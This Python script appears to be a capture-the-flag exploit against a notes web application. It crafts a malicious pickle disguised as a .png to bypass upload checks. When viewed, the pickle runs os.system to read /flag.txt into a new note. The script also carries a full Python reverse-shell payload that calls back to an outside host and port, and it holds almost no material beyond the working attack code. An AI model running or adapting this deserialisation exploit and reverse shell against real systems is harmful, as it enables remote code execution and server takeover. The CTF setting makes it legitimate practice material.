import os
import pickle
import random
import re
import string

import requests
from dotenv import load_dotenv

load_dotenv()

from yachalk import chalk

PUBLIC_IP = os.environ.get("PUBLIC_IP")
PRIVATE_IP = os.environ.get("PRIVATE_IP")
PORT = 6666

DOMAIN = os.environ.get("DOMAIN")
LOCALHOST = "http://127.0.0.1:1234/new"
TARGET_PORT = 12344
TARGET = f"http://{DOMAIN}:{TARGET_PORT}"

INNOCENT_IMAGE_PATH = "./innocent-image.png"
INFECTED_PICKLE_PATH = "./infected.pickle.png"
INFECTED_NOTE_TITLE = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
MALICIOUS_NOTE_TITLE = "☠️"

FLAG_REGEX = r"flag{.*"

session = requests.Session()
session.cookies.set(
    name=os.environ.get("COOKIE_NAME"),
    value=os.environ.get("COOKIE_VALUE"),
    domain=DOMAIN,
)


# Custom pickle-reducer for Remote Code Execution (RCE)
class PickleRCE(object):
    def __reduce__(self):
        cmd_reverse_shell = (
            """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            % (PUBLIC_IP, PORT)
        )
        cmd_cat = (
            """python3 -c 'import subprocess,os,sys,pickle;from app import Note;note = Note(title="%s",content=subprocess.getoutput("cat /flag.txt"),image_filename="%s");file = open("./notes/%s.pickle", "wb+");file.write(pickle.dumps(note));file.close()'"""
            % (
                MALICIOUS_NOTE_TITLE,
                INNOCENT_IMAGE_PATH[2:],
                MALICIOUS_NOTE_TITLE,
            )
        )

        return (os.system, (cmd_cat,))


# 1. Create RCE pickle — Saved with .png extension to bypass POST validation at server.
with open(INFECTED_PICKLE_PATH, "wb") as file:
    file.write(pickle.dumps(PickleRCE()))

trojan_image = (
    f"{INFECTED_NOTE_TITLE}.png",
    open(INFECTED_PICKLE_PATH, "rb").read(),
)

# 2. Post infected note
session.post(
    url=TARGET + "/new",
    data={
        "title": INFECTED_NOTE_TITLE,
        "content": 'Just an "innocent" note',
    },
    files={"image": trojan_image},
)

# 3. View infected note, triggering injected command
infected_note_url = TARGET + f"/notes/{INFECTED_NOTE_TITLE}.png?view=True"
session.get(url=infected_note_url)

# 4. Find flag in ☠️ malicious note created by injected command
malicious_note_url = TARGET + f"/notes/{MALICIOUS_NOTE_TITLE}.pickle?view=True"
malicious_note = session.get(url=malicious_note_url)

flag = re.search(FLAG_REGEX, malicious_note.text).group(0)

print(
    chalk.black(
        "========================================================================================"
    )
)
print(chalk.white.bold("Flag:\t"), chalk.green_bright(flag))
print(
    chalk.black(
        "========================================================================================"
    )
)
